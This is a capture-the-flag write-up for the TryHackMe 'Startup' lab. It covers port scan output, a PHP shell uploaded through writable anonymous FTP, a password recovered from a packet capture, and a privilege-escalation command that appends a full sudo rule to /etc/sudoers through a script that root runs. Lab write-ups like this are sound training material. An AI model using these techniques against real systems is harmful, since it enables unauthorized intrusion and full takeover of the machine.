-------------------

### CTF: TRYHACKME
### LAB: STARTUP

-------------------

![image](https://github.com/user-attachments/assets/9e72f931-43df-4a8d-a1ca-f002a9fa0542)

-----------------

### RECON

- Rustscan's output

      ❯ rustscan -a 10.10.148.208 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Nmap? More like slowmap.🐢
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.148.208:21
      Open 10.10.148.208:22
      Open 10.10.148.208:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 08:47 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 08:47
      Completed NSE at 08:47, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 08:47
      Completed NSE at 08:47, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 08:47
      Completed NSE at 08:47, 0.00s elapsed
      Initiating Ping Scan at 08:47
      Scanning 10.10.148.208 [2 ports]
      Completed Ping Scan at 08:47, 0.17s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 08:47
      Completed Parallel DNS resolution of 1 host. at 08:47, 0.03s elapsed
      DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 08:47
      Scanning 10.10.148.208 [3 ports]
      Discovered open port 21/tcp on 10.10.148.208
      Discovered open port 22/tcp on 10.10.148.208
      Discovered open port 80/tcp on 10.10.148.208
      Completed Connect Scan at 08:47, 0.16s elapsed (3 total ports)
      Initiating Service scan at 08:47
      Scanning 3 services on 10.10.148.208
      Completed Service scan at 08:47, 8.69s elapsed (3 services on 1 host)
      NSE: Script scanning 10.10.148.208.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 08:47
      NSE: [ftp-bounce 10.10.148.208:21] PORT response: 500 Illegal PORT command.
      Completed NSE at 08:47, 6.22s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 08:47
      Completed NSE at 08:47, 1.36s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 08:47
      Completed NSE at 08:47, 0.00s elapsed
      Nmap scan report for 10.10.148.208
      Host is up, received syn-ack (0.17s latency).
      Scanned at 2024-08-18 08:47:27 EDT for 16s
      
      PORT   STATE SERVICE REASON  VERSION
      21/tcp open  ftp     syn-ack vsftpd 3.0.3
      | ftp-syst: 
      |   STAT: 
      | FTP server status:
      |      Connected to 10.8.158.229
      |      Logged in as ftp
      |      TYPE: ASCII
      |      No session bandwidth limit
      |      Session timeout in seconds is 300
      |      Control connection is plain text
      |      Data connections will be plain text
      |      At session startup, client count was 2
      |      vsFTPd 3.0.3 - secure, fast, stable
      |_End of status
      | ftp-anon: Anonymous FTP login allowed (FTP code 230)
      | drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
      | -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
      |_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
      22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAzds8QxN5Q2TsERsJ98huSiuasmToUDi9JYWVegfTMV4Fn7t6/2ENm/9uYblUv+pLBnYeGo3XQGV23foZIIVMlLaC6ulYwuDOxy6KtHauVMlPRvYQd77xSCUqcM1ov9d00Y2y5eb7S6E7zIQCGFhm/jj5ui6bcr6wAIYtfpJ8UXnlHg5f/mJgwwAteQoUtxVgQWPsmfcmWvhreJ0/BF0kZJqi6uJUfOZHoUm4woJ15UYioryT6ZIw/ORL6l/LXy2RlhySNWi6P9y8UXrgKdViIlNCun7Cz80Cfc16za/8cdlthD1czxm4m5hSVwYYQK3C7mDZ0/jung0/AJzl48X1
      |   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOKJ0cuq3nTYxoHlMcS3xvNisI5sKawbZHhAamhgDZTM989wIUonhYU19Jty5+fUoJKbaPIEBeMmA32XhHy+Y+E=
      |   256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnFr/4W5WTyh9XBSykso6eSO6tE0Aio3gWM8Zdsckwo
      80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
      |_http-server-header: Apache/2.4.18 (Ubuntu)
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-title: Maintenance
      Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


- FFUF's output

- Ftp allows anonymous login

![image](https://github.com/user-attachments/assets/8d1a416b-ec07-4acf-94da-54441c908fbc)

- We have read write access to directory `ftp/`

![image](https://github.com/user-attachments/assets/250ec664-05b8-4b52-b73c-1515207ec9b6)

- Checking web directory `/files` shows that it lists the files and direcotries of the ftp service,we can upload a php shell via ftp to get command injection

![image](https://github.com/user-attachments/assets/3b3ce1dc-75da-4213-bffc-ed8609ee8bd9)

- Shell uploaded

![image](https://github.com/user-attachments/assets/7fbc6b58-a5dd-429a-80ce-efcdc9c1114d)

- Command injection achieved

![image](https://github.com/user-attachments/assets/49efff70-56ff-4448-88c9-b40183a22990)

---------------------

### Initial Foothold

- Shell as `www-data`

![image](https://github.com/user-attachments/assets/1d2c6f15-62b6-4354-956b-933c8ef76658)

-----------------

### User Lennie

- I discovered a directory `incidents` that contains a pcapng  file

![image](https://github.com/user-attachments/assets/afe2f78b-dc24-4247-af2a-e0226a599f39)

- I should have used `Wireshark` to analyze the pcap file but I used `strings` instead and discovered a leaked password.

![image](https://github.com/user-attachments/assets/97f1af41-bdd6-4243-94b3-e7f651650cc4)

- The password worked for Lennie and I was able to ssh to her account.

![image](https://github.com/user-attachments/assets/bdab5f79-cf22-4345-a22d-157cfd9dab2f)

---------------------

### Privesc with root script

- Lennie's home directory hosts a `scripts` which contains a `planner.sh` bash script owned by the `root` user.Although,it runs a bash script
`/etc/print.sh` owned by user `Lennie`.We can add a malicious bash code to gain root shell.

![image](https://github.com/user-attachments/assets/326be5e7-2b9d-474f-a7e8-47a49ccb99a9)

- I added this bash code to grant lennie the privilege to run all commands.The code simply copies the `all` rule to the `/etc/sudoers` file.I added the code below to the `/etc/print.sh` file.

      sudo echo "lennie ALL=(ALL:ALL) ALL" >> /etc/sudoers

- Now we can run `sudo`

![image](https://github.com/user-attachments/assets/33c6daa3-788b-4309-8e98-6c04fa4b2776)

- Root shell

![image](https://github.com/user-attachments/assets/1150b95f-3eb4-45f5-9fa2-71cbe4b22931)

--------------------

### THANKS FOR READING!!!!

---------------------











